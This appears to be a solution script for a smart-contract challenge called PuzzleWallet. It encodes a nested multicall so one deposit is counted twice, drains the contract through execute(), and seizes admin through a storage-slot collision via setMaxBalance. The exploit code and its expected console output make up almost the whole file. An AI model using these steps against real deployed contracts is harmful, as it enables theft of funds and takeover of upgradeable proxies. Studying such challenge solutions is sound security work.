require("dotenv").config();
const Web3 = require('web3');
const web3 = new Web3(process.env.INFURA_KEY);
const address = "0xdcde1dfC141EE526afE58C48be75835565806f7C";
const player = "0x176366cFD97885245fAEA72f8cB6951e52655Adf";

//we can deposit twice by input data as "["deposit()", "multicall([deposit()])"]"
const depositSig = web3.eth.abi.encodeFunctionSignature("deposit()");
//result same abi.encodeWithSelector(PuzzleWallet.deposit.selector) in solidity !!
console.log("deposit(): "+ depositSig);

const multicallSig = web3.eth.abi.encodeFunctionSignature("multicall(bytes[])");
const deposit_param = web3.eth.abi.encodeParameter('bytes[]', [depositSig]); //web3.eth.abi.encodeParameter(type, parameter);
//put deposit_param into function muticall
var multicallSigWithDepositFunc = deposit_param.substring(1);
multicallSigWithDepositFunc = multicallSigWithDepositFunc.substring(1);
multicallSigWithDepositFunc = multicallSig.toString() + multicallSigWithDepositFunc;
//result same abi.encodeWithSelector(PuzzleWallet.multicall.selector,data); in solidity when data is ["deposit_param"]
console.log("multicall([deposit()]): "+ multicallSigWithDepositFunc); 

web3.eth.getBalance(address, (err, wei) => {
    balance = web3.utils.fromWei(wei, 'ether')
    console.log("Contract balance: " + balance.toString())
})

/* 
//because if want to withdraw in execute(), it require(balances[msg.sender] >= value,need deposit first
//we use msg.value just 0.001 but got 0.002 because call deposit() twice time in multicall
contract.multicall([depositSig, multicallSigWithDepositFunc], { value: toWei('0.001') });
(await getBalance(instance)).toString();
> '0.002'
fromWei((await contract.balances(player)).toString());
> '0.002'

//Withdraw all money because function "setMaxBalance" require address(this).balance == 0
contract.execute(player, toWei('0.002'), '0x');
(await getBalance(instance)).toString();
> '0'

//Set MaxBalance to be admin because same state at slot 1
await contract.setMaxBalance(player);
*/